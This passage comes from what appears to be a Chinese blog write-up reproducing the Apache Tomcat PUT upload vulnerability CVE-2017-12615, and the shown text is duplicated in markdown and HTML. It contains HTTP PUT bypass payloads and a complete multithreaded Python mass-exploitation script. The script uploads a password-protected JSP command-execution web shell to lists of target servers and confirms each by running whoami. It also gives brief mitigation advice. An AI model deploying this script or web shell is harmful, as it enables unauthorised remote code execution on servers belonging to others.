<param-name>readonly</param-name>\n            <param-value>false</param-value>\n        </init-param>\n        <load-on-startup>1</load-on-startup>\n    </servlet>\n```\n然后，重启Tomcat。\n\n- ### 0x02 任意文件上传 · 姿势一\n思路：参考微软MSDN上关于NTFS Streams的一段资料[https://msdn.microsoft.com/en-us/library/dn393272.aspx](https://msdn.microsoft.com/en-us/library/dn393272.aspx)\n```\nAll files on an NTFS volume consist of at least one stream - the main stream – this is the normal, viewable file in which data is stored. The full name of a stream is of the form below.\n\n    <filename>:<stream name>:<stream type>\n\nThe default data stream has no name. That is, the fully qualified name for the default stream for a file called \"sample.txt\" is \"sample.txt::$DATA\" since \"sample.txt\" is the name of the file and \"$DATA\" is the stream type.\n```\n\npayload ::\n```\nPUT /111.jsp::$DATA HTTP/1.1\nHost: 10.1.1.6:8080\nUser-Agent: JNTASS\nDNT: 1\nConnection: close\n\n...jsp shell...\n```\n![img](Tomcat文件上传-CVE-2017-12615-复现/ScreenShot02.png)\n写入成功！\n\n- ### 0x03 任意文件上传 · 姿势二 （可攻击Tomcat 7.0.81）\n\n思路：可以上传jSp文件(但不能解析)，却不可上传jsp。 说明tomcat对jsp是做了一定处理的。那么就考虑是否可以使其处理过程中对文件名的识别存在差异性，前面的流程中 test.jsp/ 识别为非jsp文件，而后续保存文件的时候，文件名不接受/字符，故而忽略掉。\n\npayload ::\n```\nPUT /222.jsp/ HTTP/1.1\nHost: 10.1.1.6:8080\nUser-Agent: JNTASS\nDNT: 1\nConnection: close\n\n...jsp shell...\n```\n![img](Tomcat文件上传-CVE-2017-12615-复现/ScreenShot06.png)\n写入成功！\n\n- ### 0x04 菜刀连接\n\n![img](Tomcat文件上传-CVE-2017-12615-复现/ScreenShot04.png)\n\n\n## 批量EXP脚本\n```python\n#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\nimport argparse\nimport requests\nimport sys\nimport time\nimport threading\nimport queue\nimport re\nfrom lxml import html\n\nclass Attacker(object):\n    def __init__(self,urlList,threads,output):\n        self.urlList=urlList\n        self.threads=threads\n        self.optput=output\n        self.print_lock=threading.Lock()\n        self.savaFile_lock=threading.Lock()\n\n    def run_thread(self):\n        thread_arr=[]\n        for i in range(self.threads):\n            t=threading.Thread(target=self.attack)\n            thread_arr.append(t)\n        for i in range(self.threads):\n            thread_arr[i].start()\n        for i in range(self.threads):\n            thread_arr[i].join()\n    def saveResultToFile(self,message):\n        if self.optput is not None:\n            with open(self.optput, 'a+', encoding = 'utf8') as f:  # 以追加的方法结果写入文件\n                f.write(message[0]+\"\\t\")\n                f.write(message[1]+\"\\n\")\n\n    def attack(self):\n        body = '''<%@ page language=\"java\" import=\"java.util.*,java.io.*\" pageEncoding=\"UTF-8\"%><%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp\n        +\"\\\\n\");}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();}%><%if(\"W3akPassw0rd\".equals(request.getParameter(\"pwd\"))&&!\"\".equals(request.getParameter(\"cmd\"))){out.println(\"<pre>\"+excuteCmd(request.getParameter(\"cmd\"))+\"</pre>\");}else{out.println(\":-)\");}%>'''\n\n        while not self.urlList.empty():\n\n            url=self.urlList.get()\n            protocol=re.search(r\"(https?)\\:\\/\\/(.*?)\\/\",url+\"/\").group(1)\n            host=re.search(r\"(https?)\\:\\/\\/(.*?)\\/\",url+\"/\").group(2)\n            self.print_lock.acquire()\n            print(\" \\b\\b\"*100,end=\"\")\n            print(\"\\r[about \"+str(self.urlList.qsize())+\" left]\\t\"+\"trying attack :: \"+protocol+\"://\"+host,end=\"\")\n            self.print_lock.release()\n            try:\n\n                req = requests.options(url=protocol+\"://\"+host+\"/b4acde76d8daf7a7b3b55670ed4f245c\",timeout=10)\n                if 'allow' in req.headers and req.headers['allow'].find(\"PUT\")>0 :\n                    uploadevil=requests.put(url=protocol+\"://\"+host+\"/b4acde76d8daf7a7b3b55670ed4f245c.jsp/\",data=body,timeout=10)\n                    if (uploadevil.status_code == 201) or (uploadevil.status_code == 204):\n                        execWhoami=requests.get(url=protocol+\"://\"+host+\"/b4acde76d8daf7a7b3b55670ed4f245c.jsp?pwd=W3akPassw0rd&cmd=whoami\",timeout=10)\n                        #print(execWhoami.text)\n                        #whoami=re.search(r\"<pre>(.*)<\\/pre>\",execWhoami.text).group(1)\n                        whoami=html.fromstring(execWhoami.text).text_content()\n                        self.print_lock.acquire()\n                        print(\" \\b\\b\"*100,end=\"\")\n                        print(\"\\r🍻   \"+protocol+\"://\"+host+\"/b4acde76d8daf7a7b3b55670ed4f245c.jsp?pwd=W3akPassw0rd&cmd=whoami\\t\"+whoami)\n                        if self.optput is not None:\n                            self.saveResultToFile((protocol+\"://\"+host+\"/b4acde76d8daf7a7b3b55670ed4f245c.jsp\",whoami))\n                        self.print_lock.release()\n                    \n                    else:\n                        pass\n                else:\n                    pass\n            except:\n                pass\n                #self.print_lock.acquire()\n                #print(\"\\tFailed...   Next...\")\n                #self.print_lock.release()\n        print(\" \\b\\b\"*100,end=\"\")\n\ndef readUrls(listFile):\n    fd=open(listFile,\"rb\")\n    lines=fd.readlines()\n    fd.close()\n\n    urlList=queue.Queue()\n\n    for url in lines:\n        urlList.put(url.decode(\"ascii\"))\n    return urlList\n\ndef main():\n    headCharPic=\"\\r        .--.\\n       |o_o |    ------------------ \\n       |:_/ |   < Author: Mr.Bingo >\\n      //   \\ \\   ------------------ \\n     (|     | ) <    oddboy.cn     >\\n    /'\\_   _/`\\  ------------------\\n    \\___)=(___/\\n\"\n    print(headCharPic)\n    # Creating a parser\n    parser=argparse.ArgumentParser()\n\n    groupUser = parser.add_mutually_exclusive_group(required=True)\n    groupUser.add_argument('-u',dest=\"url\",help=\"target url\")\n    groupUser.add_argument('-U',dest='urlFile',help=\"url list file\")\n    parser.add_argument('-t',dest=\"threads\",default=1,type=int,help=\"threads\")\n    parser.add_argument('-o',dest=\"outFile\",help=\"output results\")\n\n    args=parser.parse_args()\n\n    if args.urlFile is not None:\n        urlList=readUrls(args.urlFile)\n    else:\n        urlList=queue.Queue()\n        urlList.put(args.url)\n    if args.outFile is not None:\n        filePath,fileName=os.path.split(fileFullPath)\n        if (filePath!=\"\") and (not os.path.exists(filePath)):\n            os.mikedirs(filePath)   # 若不存在这个目录则递归创建\n    \n    Attacker_obj=Attacker(urlList,args.threads,args.outFile)\n    Attacker_obj.run_thread()\n\nif __name__ == '__main__':\n    main()\n    print(\"\\n@@@   Done   @@@\")\n```\n![img](Tomcat文件上传-CVE-2017-12615-复现/ScreenShot05.png)\n\n## 漏洞总结\n\n该漏洞利用的前提条件需要手动开启readOnly功能，以支持上传操作，默认配置的情况下是无法成功利用漏洞，从实际测试来看，漏洞危害性并没有那么高。但是如果用户一旦启用了readOnly功能，黑客可利用漏洞成功入侵。\n\n根据业务评估配置conf/webxml文件的readOnly值为Ture或注释参数，禁用PUT方法并重启tomcat服务，临时规避安全风险；\n注意： 如果禁用PUT方法，对于依赖PUT方法的应用，可能导致业务失效。\n\n\n## 参考链接\n\n- [NTFS Streams | https://msdn.microsoft.com/en-us/library/dn393272.aspx](https://msdn.microsoft.com/en-us/library/dn393272.aspx)\n- [http://tomcat.apache.org/security-7.html#Fixed_in_Apache_Tomcat_7.0.81](http://tomcat.apache.org/security-7.html#Fixed_in_Apache_Tomcat_7.0.81)\n\n- [Tomcat信息泄漏和远程代码执行漏洞分析报告（CVE-2017-12615/CVE-2017-12616）](https://mp.weixin.qq.com/s/wWkb079hUYOwDgVQqEqGZQ)","slug":"Tomcat文件上传-CVE-2017-12615-复现","published":1,"updated":"2017-10-19T08:29:45.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj9qrjfs5000d97uvov87gaax","content":"<h2 id=\"漏洞概述\"><a href=\"#漏洞概述\" class=\"headerlink\" title=\"漏洞概述\"></a>漏洞概述</h2><p><strong>远程代码执行漏洞（CVE-2017-12615）    影响： Apache Tomcat 7.0.0 - 7.0.79（7.0.81修复不完全）</strong></p>\n<p>当 Tomcat 启用了 HTTP PUT 请求方法（将web.xml文件中 readonly 初始化参数由默认值设置为 false），攻击者将有可能可通过精心构造的攻击请求向服务器上传包含任意代码的 jsp 文件。之后，jsp 文件中的代码将能被服务器执行。</p>\n<a id=\"more\"></a>\n<h2 id=\"基本信息\"><a href=\"#基本信息\" class=\"headerlink\" title=\"基本信息\"></a>基本信息</h2><p>漏洞名称：Tomcat任意文件上传漏洞</p>\n<p>漏洞编号：CVE-2017-12615</p>\n<p>漏洞影响：上传包含任意代码的文件，并被服务器执行。</p>\n<p>影响平台：Windows/Linux</p>\n<p>影响版本：Apache Tomcat &lt;= 7.0.81 | Apache Tomcat &lt;= 8.5.20 | Apache Tomcat &lt;= 9.0.0.M26</p>\n<h2 id=\"原理分析\"><a href=\"#原理分析\" class=\"headerlink\" title=\"原理分析\"></a>原理分析</h2><p>本漏洞涉及到 DefaultServlet和 JspServlet，DefaultServlet的作用是处理静态文件 ，JspServlet 的作用是处理jsp 与jspx 文件的请求，同时DefaultServlet 可以处理 PUT 或 DELETE请求。</p>\n<p>除了jsp和jspx默认是由org.apache.jasper.servlet.JspServlet处理，其他默认都是由org.apache.catalina.servlets.DefaultServlet来处理。</p>\n<p>即使设置readonly为false，默认tomcat也不允许PUT上传jsp和jspx文件的，因为后端都用org.apache.jasper.servlet.JspServlet来处理jsp或是jspx后缀的请求了，而JspServlet中没有PUT上传的逻辑，PUT的代码实现只存在于DefaultServlet中。</p>\n<p>这个漏洞的根本是通过构造特殊后缀名，绕过了tomcat检测，让它用DefaultServlet的逻辑去处理请求，从而上传jsp文件。</p>\n<p>目前主要三种方法：</p>\n<p>l evil.jsp%20</p>\n<p>l evil.jsp::$DATA</p>\n<p>l evil.jsp/</p>\n<h2 id=\"复现过程\"><a href=\"#复现过程\" class=\"headerlink\" title=\"复现过程\"></a>复现过程</h2><ul>\n<li><h3 id=\"0x00-安装Tomcat-7-0-79\"><a href=\"#0x00-安装Tomcat-7-0-79\" class=\"headerlink\" title=\"0x00 安装Tomcat 7.0.79\"></a>0x00 安装Tomcat 7.0.79</h3><p><img src=\"/2017/09/Tomcat文件上传-CVE-2017-12615-复现/ScreenShot01.png\" alt=\"img\"></p>\n</li>\n<li><h3 id=\"0x01-开启HTTP-PUT\"><a href=\"#0x01-开启HTTP-PUT\" class=\"headerlink\" title=\"0x01 开启HTTP PUT\"></a>0x01 开启HTTP PUT</h3></li>\n</ul>\n<p>修改Tomcat 7.0/conf/web.xml文件<br>添加readonly属性，使者readonly=false.<br><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">servlet</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">servlet-name</span>&gt;</span>default<span class=\"tag\">&lt;/<span class=\"name\">servlet-name</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">servlet-class</span>&gt;</span>org.apache.catalina.servlets.DefaultServlet<span class=\"tag\">&lt;/<span class=\"name\">servlet-class</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">init-param</span>&gt;</span></div><div class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">param-name</span>&gt;</span>debug<span class=\"tag\">&lt;/<span class=\"name\">param-name</span>&gt;</span></div><div class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">param-value</span>&gt;</span>0<span class=\"tag\">&lt;/<span class=\"name\">param-value</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">init-param</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">init-param</span>&gt;</span></div><div class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">param-name</span>&gt;</span>listings<span class=\"tag\">&lt;/<span class=\"name\">param-name</span>&gt;</span></div><div class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">param-value</span>&gt;</span>false<span class=\"tag\">&lt;/<span class=\"name\">param-value</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">init-param</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">init-param</span>&gt;</span></div><div class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">param-name</span>&gt;</span>readonly<span class=\"tag\">&lt;/<span class=\"name\">param-name</span>&gt;</span></div><div class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">param-value</span>&gt;</span>false<span class=\"tag\">&lt;/<span class=\"name\">param-value</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">init-param</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">load-on-startup</span>&gt;</span>1<span class=\"tag\">&lt;/<span class=\"name\">load-on-startup</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">servlet</span>&gt;</span></div></pre></td></tr></table></figure></p>\n<p>然后，重启Tomcat。</p>\n<ul>\n<li><h3 id=\"0x02-任意文件上传-·-姿势一\"><a href=\"#0x02-任意文件上传-·-姿势一\" class=\"headerlink\" title=\"0x02 任意文件上传 · 姿势一\"></a>0x02 任意文件上传 · 姿势一</h3>思路：参考微软MSDN上关于NTFS Streams的一段资料<a href=\"https://msdn.microsoft.com/en-us/library/dn393272.aspx\" target=\"_blank\" rel=\"external\">https://msdn.microsoft.com/en-us/library/dn393272.aspx</a><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\">All files on an NTFS volume consist of at least one stream - the main stream – this is the normal, viewable file in which data is stored. The full name of a stream is of the form below.</div><div class=\"line\"></div><div class=\"line\">    &lt;filename&gt;:&lt;stream name&gt;:&lt;stream type&gt;</div><div class=\"line\"></div><div class=\"line\">The default data stream has no name. That is, the fully qualified name for the default stream for a file called &quot;sample.txt&quot; is &quot;sample.txt::$DATA&quot; since &quot;sample.txt&quot; is the name of the file and &quot;$DATA&quot; is the stream type.</div></pre></td></tr></table></figure>\n</li>\n</ul>\n<p>payload ::<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\">PUT /111.jsp::$DATA HTTP/1.1</div><div class=\"line\">Host: 10.1.1.6:8080</div><div class=\"line\">User-Agent: JNTASS</div><div class=\"line\">DNT: 1</div><div class=\"line\">Connection: close</div><div class=\"line\"></div><div class=\"line\">...jsp shell...</div></pre></td></tr></table></figure></p>\n<p><img src=\"/2017/09/Tomcat文件上传-CVE-2017-12615-复现/ScreenShot02.png\" alt=\"img\"><br>写入成功！</p>\n<ul>\n<li><h3 id=\"0x03-任意文件上传-·-姿势二-（可攻击Tomcat-7-0-81）\"><a href=\"#0x03-任意文件上传-·-姿势二-（可攻击Tomcat-7-0-81）\" class=\"headerlink\" title=\"0x03 任意文件上传 · 姿势二 （可攻击Tomcat 7.0.81）\"></a>0x03 任意文件上传 · 姿势二 （可攻击Tomcat 7.0.81）</h3></li>\n</ul>\n<p>思路：可以上传jSp文件(但不能解析)，却不可上传jsp。 说明tomcat对jsp是做了一定处理的。那么就考虑是否可以使其处理过程中对文件名的识别存在差异性，前面的流程中 test.jsp/ 识别为非jsp文件，而后续保存文件的时候，文件名不接受/字符，故而忽略掉。</p>\n<p>payload ::<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\">PUT /222.jsp/ HTTP/1.1</div><div class=\"line\">Host: 10.1.1.6:8080</div><div class=\"line\">User-Agent: JNTASS</div><div class=\"line\">DNT: 1</div><div class=\"line\">Connection: close</div><div class=\"line\"></div><div class=\"line\">...jsp shell...</div></pre></td></tr></table></figure></p>\n<p><img src=\"/2017/09/Tomcat文件上传-CVE-2017-12615-复现/ScreenShot06.png\" alt=\"img\"><br>写入成功！</p>\n<ul>\n<li><h3 id=\"0x04-菜刀连接\"><a href=\"#0x04-菜刀连接\" class=\"headerlink\" title=\"0x04 菜刀连接\"></a>0x04 菜刀连接</h3></li>\n</ul>\n<p><img src=\"/2017/09/Tomcat文件上传-CVE-2017-12615-复现/ScreenShot04.png\" alt=\"img\"></p>\n<h2 id=\"批量EXP脚本\"><a href=\"#批量EXP脚本\" class=\"headerlink\" title=\"批量EXP脚本\"></a>批量EXP脚本</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div><div class=\"line\">82</div><div class=\"line\">83</div><div class=\"line\">84</div><div class=\"line\">85</div><div class=\"line\">86</div><div class=\"line\">87</div><div class=\"line\">88</div><div class=\"line\">89</div><div class=\"line\">90</div><div class=\"line\">91</div><div class=\"line\">92</div><div class=\"line\">93</div><div class=\"line\">94</div><div class=\"line\">95</div><div class=\"line\">96</div><div class=\"line\">97</div><div class=\"line\">98</div><div class=\"line\">99</div><div class=\"line\">100</div><div class=\"line\">101</div><div class=\"line\">102</div><div class=\"line\">103</div><div class=\"line\">104</div><div class=\"line\">105</div><div class=\"line\">106</div><div class=\"line\">107</div><div class=\"line\">108</div><div class=\"line\">109</div><div class=\"line\">110</div><div class=\"line\">111</div><div class=\"line\">112</div><div class=\"line\">113</div><div class=\"line\">114</div><div class=\"line\">115</div><div class=\"line\">116</div><div class=\"line\">117</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#!/usr/bin/env python3</span></div><div class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">import</span> argparse</div><div class=\"line\"><span class=\"keyword\">import</span> requests</div><div class=\"line\"><span class=\"keyword\">import</span> sys</div><div class=\"line\"><span class=\"keyword\">import</span> time</div><div class=\"line\"><span class=\"keyword\">import</span> threading</div><div class=\"line\"><span class=\"keyword\">import</span> queue</div><div class=\"line\"><span class=\"keyword\">import</span> re</div><div class=\"line\"><span class=\"keyword\">from</span> lxml <span class=\"keyword\">import</span> html</div><div class=\"line\"></div><div class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Attacker</span><span class=\"params\">(object)</span>:</span></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span><span class=\"params\">(self,urlList,threads,output)</span>:</span></div><div class=\"line\">        self.urlList=urlList</div><div class=\"line\">        self.threads=threads</div><div class=\"line\">        self.optput=output</div><div class=\"line\">        self.print_lock=threading.Lock()</div><div class=\"line\">        self.savaFile_lock=threading.Lock()</div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">run_thread</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\">        thread_arr=[]</div><div class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(self.threads):</div><div class=\"line\">            t=threading.Thread(target=self.attack)</div><div class=\"line\">            thread_arr.append(t)</div><div class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(self.threads):</div><div class=\"line\">            thread_arr[i].start()</div><div class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(self.threads):</div><div class=\"line\">            thread_arr[i].join()</div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">saveResultToFile</span><span class=\"params\">(self,message)</span>:</span></div><div class=\"line\">        <span class=\"keyword\">if</span> self.optput <span class=\"keyword\">is</span> <span class=\"keyword\">not</span> <span class=\"keyword\">None</span>:</div><div class=\"line\">            <span class=\"keyword\">with</span> open(self.optput, <span class=\"string\">'a+'</span>, encoding = <span class=\"string\">'utf8'</span>) <span class=\"keyword\">as</span> f:  <span class=\"comment\"># 以追加的方法结果写入文件</span></div><div class=\"line\">                f.write(message[<span class=\"number\">0</span>]+<span class=\"string\">\"\\t\"</span>)</div><div class=\"line\">                f.write(message[<span class=\"number\">1</span>]+<span class=\"string\">\"\\n\"</span>)</div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">attack</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\">        body = <span class=\"string\">'''&lt;%@ page language=\"java\" import=\"java.util.*,java.io.*\" pageEncoding=\"UTF-8\"%&gt;&lt;%!public static String excuteCmd(String c) &#123;StringBuilder line = new StringBuilder();try &#123;Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) &#123;line.append(temp</span></div><div class=\"line\">        +\"\\\\n\");&#125;buf.close();&#125; catch (Exception e) &#123;line.append(e.getMessage());&#125;return line.toString();&#125;%&gt;&lt;%if(\"W3akPassw0rd\".equals(request.getParameter(\"pwd\"))&amp;&amp;!\"\".equals(request.getParameter(\"cmd\")))&#123;out.println(\"&lt;pre&gt;\"+excuteCmd(request.getParameter(\"cmd\"))+\"&lt;/pre&gt;\");&#125;else&#123;out.println(\":-)\");&#125;%&gt;'''</div><div class=\"line\"></div><div class=\"line\">        <span class=\"keyword\">while</span> <span class=\"keyword\">not</span> self.urlList.empty():</div><div class=\"line\"></div><div class=\"line\">            url=self.urlList.get()</div><div class=\"line\">            protocol=re.search(<span class=\"string\">r\"(https?)\\:\\/\\/(.*?)\\/\"</span>,url+<span class=\"string\">\"/\"</span>).group(<span class=\"number\">1</span>)</div><div class=\"line\">            host=re.search(<span class=\"string\">r\"(https?)\\:\\/\\/(.*?)\\/\"</span>,url+<span class=\"string\">\"/\"</span>).group(<span class=\"number\">2</span>)</div><div class=\"line\">            self.print_lock.acquire()</div><div class=\"line\">            print(<span class=\"string\">\" \\b\\b\"</span>*<span class=\"number\">100</span>,end=<span class=\"string\">\"\"</span>)</div><div class=\"line\">            print(<span class=\"string\">\"\\r[about \"</span>+str(self.urlList.qsize())+<span class=\"string\">\" left]\\t\"</span>+<span class=\"string\">\"trying attack :: \"</span>+protocol+<span class=\"string\">\"://\"</span>+host,end=<span class=\"string\">\"\"</span>)</div><div class=\"line\">            self.print_lock.release()</div><div class=\"line\">            <span class=\"keyword\">try</span>:</div><div class=\"line\"></div><div class=\"line\">                req = requests.options(url=protocol+<span class=\"string\">\"://\"</span>+host+<span class=\"string\">\"/b4acde76d8daf7a7b3b55670ed4f245c\"</span>,timeout=<span class=\"number\">10</span>)</div><div class=\"line\">                <span class=\"keyword\">if</span> <span class=\"string\">'allow'</span> <span class=\"keyword\">in</span> req.headers <span class=\"keyword\">and</span> req.headers[<span class=\"string\">'allow'</span>].find(<span class=\"string\">\"PUT\"</span>)&gt;<span class=\"number\">0</span> :</div><div class=\"line\">                    uploadevil=requests.put(url=protocol+<span class=\"string\">\"://\"</span>+host+<span class=\"string\">\"/b4acde76d8daf7a7b3b55670ed4f245c.jsp/\"</span>,data=body,timeout=<span class=\"number\">10</span>)</div><div class=\"line\">                    <span class=\"keyword\">if</span> (uploadevil.status_code == <span class=\"number\">201</span>) <span class=\"keyword\">or</span> (uploadevil.status_code == <span class=\"number\">204</span>):</div><div class=\"line\">                        execWhoami=requests.get(url=protocol+<span class=\"string\">\"://\"</span>+host+<span class=\"string\">\"/b4acde76d8daf7a7b3b55670ed4f245c.jsp?pwd=W3akPassw0rd&amp;cmd=whoami\"</span>,timeout=<span class=\"number\">10</span>)</div><div class=\"line\">                        <span class=\"comment\">#print(execWhoami.text)</span></div><div class=\"line\">                        <span class=\"comment\">#whoami=re.search(r\"&lt;pre&gt;(.*)&lt;\\/pre&gt;\",execWhoami.text).group(1)</span></div><div class=\"line\">                        whoami=html.fromstring(execWhoami.text).text_content()</div><div class=\"line\">                        self.print_lock.acquire()</div><div class=\"line\">                        print(<span class=\"string\">\" \\b\\b\"</span>*<span class=\"number\">100</span>,end=<span class=\"string\">\"\"</span>)</div><div class=\"line\">                        print(<span class=\"string\">\"\\r🍻   \"</span>+protocol+<span class=\"string\">\"://\"</span>+host+<span class=\"string\">\"/b4acde76d8daf7a7b3b55670ed4f245c.jsp?pwd=W3akPassw0rd&amp;cmd=whoami\\t\"</span>+whoami)</div><div class=\"line\">                        <span class=\"keyword\">if</span> self.optput <span class=\"keyword\">is</span> <span class=\"keyword\">not</span> <span class=\"keyword\">None</span>:</div><div class=\"line\">                            self.saveResultToFile((protocol+<span class=\"string\">\"://\"</span>+host+<span class=\"string\">\"/b4acde76d8daf7a7b3b55670ed4f245c.jsp\"</span>,whoami))</div><div class=\"line\">                        self.print_lock.release()</div><div class=\"line\">                    </div><div class=\"line\">                    <span class=\"keyword\">else</span>:</div><div class=\"line\">                        <span class=\"keyword\">pass</span></div><div class=\"line\">                <span class=\"keyword\">else</span>:</div><div class=\"line\">                    <span class=\"keyword\">pass</span></div><div class=\"line\">            <span class=\"keyword\">except</span>:</div><div class=\"line\">                <span class=\"keyword\">pass</span></div><div class=\"line\">                <span class=\"comment\">#self.print_lock.acquire()</span></div><div class=\"line\">                <span class=\"comment\">#print(\"\\tFailed...   Next...\")</span></div><div class=\"line\">                <span class=\"comment\">#self.print_lock.release()</span></div><div class=\"line\">        print(<span class=\"string\">\" \\b\\b\"</span>*<span class=\"number\">100</span>,end=<span class=\"string\">\"\"</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">readUrls</span><span class=\"params\">(listFile)</span>:</span></div><div class=\"line\">    fd=open(listFile,<span class=\"string\">\"rb\"</span>)</div><div class=\"line\">    lines=fd.readlines()</div><div class=\"line\">    fd.close()</div><div class=\"line\"></div><div class=\"line\">    urlList=queue.Queue()</div><div class=\"line\"></div><div class=\"line\">    <span class=\"keyword\">for</span> url <span class=\"keyword\">in</span> lines:</div><div class=\"line\">        urlList.put(url.decode(<span class=\"string\">\"ascii\"</span>))</div><div class=\"line\">    <span class=\"keyword\">return</span> urlList</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">main</span><span class=\"params\">()</span>:</span></div><div class=\"line\">    headCharPic=<span class=\"string\">\"\\r        .--.\\n       |o_o |    ------------------ \\n       |:_/ |   &lt; Author: Mr.Bingo &gt;\\n      //   \\ \\   ------------------ \\n     (|     | ) &lt;    oddboy.cn     &gt;\\n    /'\\_   _/`\\  ------------------\\n    \\___)=(___/\\n\"</span></div><div class=\"line\">    print(headCharPic)</div><div class=\"line\">    <span class=\"comment\"># Creating a parser</span></div><div class=\"line\">    parser=argparse.ArgumentParser()</div><div class=\"line\"></div><div class=\"line\">    groupUser = parser.add_mutually_exclusive_group(required=<span class=\"keyword\">True</span>)</div><div class=\"line\">    groupUser.add_argument(<span class=\"string\">'-u'</span>,dest=<span class=\"string\">\"url\"</span>,help=<span class=\"string\">\"target url\"</span>)</div><div class=\"line\">    